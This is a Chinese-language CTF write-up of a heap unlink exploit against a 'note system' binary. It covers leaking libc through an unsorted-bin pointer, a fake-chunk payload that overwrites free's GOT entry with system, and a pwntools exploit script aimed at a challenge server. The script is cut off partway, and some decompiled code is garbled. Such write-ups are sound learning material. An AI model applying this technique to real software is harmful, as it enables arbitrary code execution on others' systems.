这题是经典的堆漏洞中的unlink
保护机制：开了nx和[canary](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/)
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
IDA查看一波：
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int v3; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v4; // [rsp+8h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      init();
      puts("welcome to note system");
      while ( 1 )
      {
        menu();
        puts("please chooice :");
        __isoc99_scanf("%d", &v3);
        switch ( v3 )
        {
          case 1:
            touch();
            break;
          case 2:
            delete();
            break;
          case 3:
            show();
            break;
          case 4:
            take_note();
            break;
          case 5:
            exit_0();
            return;
          default:
            puts("no such option");
            break;
        }
      }
    }
经典堆漏洞题目的菜单功能
主要有四个功能
touch()函数，在现有chunk不满10个前提下，创建一个chunk，大小不限，得到的chunk指针存入bss段中的buf
    unsigned __int64 touch()
    {
      int v1; // [rsp+0h] [rbp-10h]
      int i; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v3; // [rsp+8h] [rbp-8h]
      v3 = __readfsqword(0x28u);
      for ( i = 0; i = 0 && v1 = 0 && v1 = 0 && v1 = 0 && v1 fd;                                                                      
       BK = P->bk;                                                                      
       if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
         malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
       else {                                                                      
           FD->bk = BK;                                                              
           BK->fd = FD;                                                              
           if (!in_smallbin_range (P->size)                                      
               && __builtin_expect (P->fd_nextsize != NULL, 0)) {                      
               if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              
                   || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
                 malloc_printerr (check_action,                                      
                                  "corrupted double-linked list (not small)",    
                                  P, AV);                                              
               if (FD->fd_nextsize == NULL) {                                      
                   if (P->fd_nextsize == P)                                      
                     FD->fd_nextsize = FD->bk_nextsize = FD;                      
                   else {                                                              
                       FD->fd_nextsize = P->fd_nextsize;                              
                       FD->bk_nextsize = P->bk_nextsize;                              
                       P->fd_nextsize->bk_nextsize = FD;                              
                       P->bk_nextsize->fd_nextsize = FD;                              
                     }                                                              
                 } else {                                                              
                   P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      
                   P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      
                 }                                                                      
             }                                                                      
         }                                                                              
     }
我们关注的点在于最后造成的结果会是 ：
FD->bk = BK;
BK->fd = FD;
如果巧妙的构造fd，bk则会导致一个任意地址写的漏洞
同时这个unlink有一个检查机制需要绕过：
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
         malloc_printerr (check_action, "corrupted double-linked list", P, AV);
即检查：chunk1前一个chunk的bk是不是chunk1，chunk1后一个chunk的fd是不是chunk1
如果我们通过touch函数构造chunk0和chunk1，大小都是0x80，接着再通过take_note函数对chunk0进行内容添加，由于输入的字节有0x100那么多，就可以通过溢出，任意修改chunk1的size，使得size字段的p标志位为0，让chunk0被误认为是已经free掉的chunk，这是实现unlink的一个前提条件，即要能修改size字段
接下来讲讲这题的思路，分为三大步骤：
  1. 泄漏出libc，从而得到system的真正地址
  2. 进行unlink，使得某个chunk的指针指向free函数的got表，并通过修改chunk内容从而修改free的got表为system的真实地址
  3. free掉一个内容为“/bin/sh\x00”的chunk，也就相对应执行了system(/bin/sh)
步骤一：
申请chunk0，chunk1，大小都为0x80
free chunk0
再重新申请一个chunk2，此时chunk2得到的地址和chunk0实际上是一样的，那么内容也会是一样的
由于chunk0被free的时候根据大小被放入了unsorted bins中，这时它的fd和bk都会指向unsorted bins
如果此时通过show函数打印出chunk2的内容，则实际上会打印出chunk0的fd和bk，也就泄漏出unsorted bins
当一个small chunk被free的时候，首先是被安排到unsorted bins中，  
这时它的fd和bk都是指向表头的，因此泄露的地址是的地址,  
而-0x10为函数的真实地址，因此可以用这个函数来泄露libc的基地址
步骤二：
申请chunk0，chunk1，chunk2 ,大小都为0x80,内容均随意填充
构造 paylode：
payload = p64(0)+p64(0x81)+p64(fd)+p64(bk)+"a"*0x60  
payload += p64(0x80)+p64(0x90)
目的是伪造一个chunk，使得他的大小为0x80，fd为0x6020c0-3*8，bk=fd+8 （0x602c0c是buf的地址）
通过输入paylode到chunk0中再溢出修改chunk1的pre_size
和size为0x80和0x90，让它误以为chunk1前面就有一个大小为0x80且处于free的状态
接着free掉chunk1
此时就进行了unlink的操作
FD->bk = BK ---> buf = buf -2*8
BK->fd = FD ---> buf = buf -3*8
造成的结果是buf[0]的地方存储着【buf-3*8】这个地址
回顾上面的take_note函数可以发现，是通过buf这个数组来向chunk中写入内容的
如果此时buf[0]的内容变成了【buf-3*8】而不是chunk0的指针
那么在向chunk0写入内容的时候就会变成向【buf-3*8】写入内容
这时就可以改变buf的内容了！将buf[n]的内容都可以被我们改变
如果将chunk1在buf中的指针改成free的got表，那么就可以改写free的gotb 表了
步骤三：
这时再向chunk2中写入“/bin/\sh”
再将chunk2 free掉
就相当于执行了：system(/bin/sh)
exp如下：
    #encoding:utf-8
    #!/upr/bin/env python
    from pwn import *
    context.log_level = "debug"
    bin_elf = "./supwn5"
    context.binary=bin_elf
    elf = ELF(bin_elf)
    libc = ELF("./libc64.so")
    #libc = elf.libc
    if sys.argv[1] == "r":
        p = remote("43.254.3.203",10005)
    elif sys.argv[1] == "l":
        p = process(bin_elf)
    #-------------------------------------    def sl(s):
        return p.sendline(s)
    def sd(s):
        return p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def sla(p,a,s):
        return p.sendlineafter(a,s)
    def sda(p,a,s):
        return p.sendafter(a,s)
    def debug(addr=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    def touch(size):
        sla(p,"please chooice :\n","1")
        sla(p,"please input the size : \n",str(size))
    def delete(index):